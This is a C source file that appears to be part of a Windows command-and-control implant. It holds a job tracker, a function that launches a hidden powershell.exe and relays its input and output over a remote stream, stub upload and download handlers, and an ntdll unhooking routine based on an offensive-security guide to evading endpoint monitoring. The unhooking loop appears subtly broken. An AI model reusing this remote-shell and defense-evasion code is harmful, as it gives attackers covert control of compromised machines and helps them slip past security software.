#define _AMD64_
#include<synchapi.h>
#include<TlHelp32.h>
#include<Psapi.h>

#include "../transport/transport.h"
#include "jobs.h"

int track_job(HANDLE* job_thread, struct jobs_t* jobs) {
    /*
        find next active in use slot
        set handle to job_thread job
        set active to 1
    */
    EnterCriticalSection(&jobs->jobs_cs);
    
    int next_free_slot = -1;
    int cur_slot = 0;
    
    while (next_free_slot == -1 && cur_slot != MAX_JOBS) {
        if (jobs->jobs[cur_slot].active == JOB_ACTIVE) cur_slot++;
        else next_free_slot = cur_slot;
    }
    
    if (next_free_slot != -1) {
        jobs->jobs[next_free_slot].job_thread = job_thread;
        jobs->jobs[next_free_slot].active = JOB_ACTIVE;
    }

    LeaveCriticalSection(&jobs->jobs_cs);
    
    return next_free_slot;
}

void untrack_job(HANDLE* job_thread, struct jobs_t* jobs) {
    int cur_slot = 0;

    EnterCriticalSection(&jobs->jobs_cs);
    
    while (jobs->jobs[cur_slot].job_thread != job_thread &&
        cur_slot != MAX_JOBS)
        cur_slot++;

    jobs->jobs[cur_slot].active = JOB_NOT;

    LeaveCriticalSection(&jobs->jobs_cs);
}

void jobs_init(struct jobs_t* jobs) {
    for (int i = 0; i < MAX_JOBS; i++) {
        jobs->jobs[i].active = JOB_NOT;
    }
}

struct powershell_info {
    PROCESS_INFORMATION proc_info;
    HANDLE child_out_rd;
    HANDLE child_out_wr;
    HANDLE child_in_rd;
    HANDLE child_in_wr;
};

int _init_powershell_proc(struct powershell_info* info) {
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.bInheritHandle = TRUE;
    sec_attr.lpSecurityDescriptor = NULL;

    /* Connect the output from the process to a file descriptor */
    BOOL res = FALSE;
    res = CreatePipe(
        &info->child_out_rd,
        &info->child_out_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_out_rd,
        HANDLE_FLAG_INHERIT,
        0
    );

    /* Connect the input from the process to a file descriptor */
    res = CreatePipe(
        &info->child_in_rd,
        &info->child_in_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_in_wr,
        HANDLE_FLAG_INHERIT,
        0
    );

    STARTUPINFO startup_info;
    ZeroMemory(&startup_info, sizeof(startup_info));

    startup_info.cb = sizeof(STARTUPINFO);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
#ifdef NDEBUG
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
#endif
    startup_info.hStdError = info->child_out_wr;
    startup_info.hStdOutput = info->child_out_wr;
    startup_info.hStdInput = info->child_in_rd;

    ZeroMemory(&info->proc_info, sizeof(PROCESS_INFORMATION));

    wchar_t cmd[] = L"powershell.exe";

    res = CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &startup_info,
        &info->proc_info
    );
    if (res == FALSE) return -1;

    return 0;
}

void _cleanup_powershell(struct powershell_info* info) {
    CloseHandle(info->proc_info.hProcess);
    CloseHandle(info->proc_info.hThread);
    CloseHandle(info->child_out_rd);
    CloseHandle(info->child_out_wr);
    CloseHandle(info->child_in_rd);
    CloseHandle(info->child_in_wr);
}

void implant_powershell(tremont_stream_id stream_id, Tremont_Nexus* nexus) {
    int res = -1;

    struct powershell_info info;
    res = _init_powershell_proc(&info);
    if (res != 0) {
        //perror("Unable to start Powershell!\n");
        exit(-1);
    }

    tremont_opts_stream(stream_id, OPT_NONBLOCK, 1, nexus);

    char temp_recv[255];
    char temp_out[255];
    int written = 0;
    int recvd = 0;
    int avail = 0;
    int read = 0;

    while (1) {
        if (WaitForSingleObject(
            info.proc_info.hProcess, 0) == WAIT_OBJECT_0) {
            break;
        }
        if (tremont_poll_stream(stream_id, nexus) == -1) break;
        memset(temp_recv, 0, sizeof(temp_recv));
        recvd = tremont_recv(stream_id, temp_recv, sizeof(temp_recv), nexus);

        if (recvd > 0) {
            WriteFile(info.child_in_wr, temp_recv, recvd, &written, NULL);
        }

        PeekNamedPipe(
            info.child_out_rd,
            NULL,
            0,
            NULL,
            &avail,
            NULL
        );

        if (avail > 0) {
            memset(temp_out, 0, sizeof(temp_out));
            ReadFile(info.child_out_rd, temp_out, sizeof(temp_out), &read, NULL);
            tremont_send(stream_id, temp_out, read, nexus);
        }
    }

    tremont_end_stream(stream_id, nexus);
    _cleanup_powershell(&info);
}

int implant_upload(struct upload_req_t* req) {
    /*
        Expand path
        CreateFileA
        recv
        write to file
    */
    return 0;
}

int implant_download(struct download_req_t* req) {
    /*
        Expand path
        CreateFileA
        read from file
        send
    */
    return 0;
}

void _freeze_all_other_threads() {
    uint32_t my_thread_id;
    my_thread_id = GetCurrentThreadId();

    HANDLE snapshot;
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 thread_entry;
    thread_entry.dwSize = sizeof(thread_entry);
    Thread32First(snapshot, &thread_entry);

    do {
        if (thread_entry.th32ThreadID == my_thread_id) continue;

        HANDLE thread_handle;
        thread_handle = OpenThread(THREAD_ALL_ACCESS,
            FALSE,
            thread_entry.th32ThreadID);

        if (thread_handle != 0) {
            SuspendThread(thread_handle);
            CloseHandle(thread_handle);
        }

        thread_entry.dwSize = sizeof(thread_entry);
    } while (Thread32Next(snapshot, &thread_entry));
}

void _unfreeze_all_other_threads() {
    uint32_t my_thread_id;
    my_thread_id = GetCurrentThreadId();

    HANDLE snapshot;
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 thread_entry;
    thread_entry.dwSize = sizeof(thread_entry);
    Thread32First(snapshot, &thread_entry);

    do {
        if (thread_entry.th32ThreadID == my_thread_id) continue;

        HANDLE thread_handle;
        thread_handle = OpenThread(THREAD_ALL_ACCESS,
            FALSE,
            thread_entry.th32ThreadID);

        if (thread_handle != 0) {
            ResumeThread(thread_handle);
            CloseHandle(thread_handle);
        }

        thread_entry.dwSize = sizeof(thread_entry);
    } while (Thread32Next(snapshot, &thread_entry));
}

//based off of https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
int implant_unhookl(struct unhool_req_t* req) {
    _freeze_all_other_threads();

    MODULEINFO module_info;
    HANDLE process_handle = GetCurrentProcess();
    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    if (ntdll_module == NULL) return -1;

    GetModuleInformation(process_handle,
        ntdll_module, &module_info, sizeof(module_info));

    void* ntdll_base = module_info.lpBaseOfDll;
    HANDLE ntdll_file = CreateFileA(
        "c:\\windows\\system32\\ntdll.dll", 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL
    );
   
    HANDLE ntdll_filemap = CreateFileMapping(ntdll_file, 
        NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (ntdll_filemap == NULL) goto ERR;
    
    void* ntdll_mmap = MapViewOfFile(ntdll_filemap,
        FILE_MAP_READ, 0, 0, 0);
    if (ntdll_mmap == NULL) goto ERR;

    PIMAGE_DOS_HEADER dos_header;
    dos_header = (PIMAGE_DOS_HEADER)ntdll_base;

    PIMAGE_NT_HEADERS nt_headers;
    nt_headers = (PIMAGE_NT_HEADERS)(
        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
    );

    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section_header;
        section_header = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + 
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
        );

        if (!strncmp(section_header->Name, ".text", 5)) continue;
        
        BOOL is_protected;
        uint32_t old_protection;
        uint32_t size_of_text;
        
        DWORD* file_text_section;
        DWORD* running_text_section;

        size_of_text = section_header->Misc.VirtualSize;

        running_text_section = (DWORD*)ntdll_base +
            section_header->VirtualAddress;

        file_text_section = (DWORD*)ntdll_mmap +
            section_header->VirtualAddress;

        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            PAGE_READWRITE,
            &old_protection
        );
        
        memcpy(running_text_section, file_text_section, size_of_text);
        
        is_protected = VirtualProtect(
            running_text_section,
            size_of_text,
            old_protection,
            &old_protection
        );
    }

    _unfreeze_all_other_threads();
    CloseHandle(process_handle);
    CloseHandle(ntdll_module);
    CloseHandle(ntdll_file);

    return 0;

ERR:
    _unfreeze_all_other_threads();
    CloseHandle(process_handle);
    CloseHandle(ntdll_module);
    CloseHandle(ntdll_file);
    return -1;
}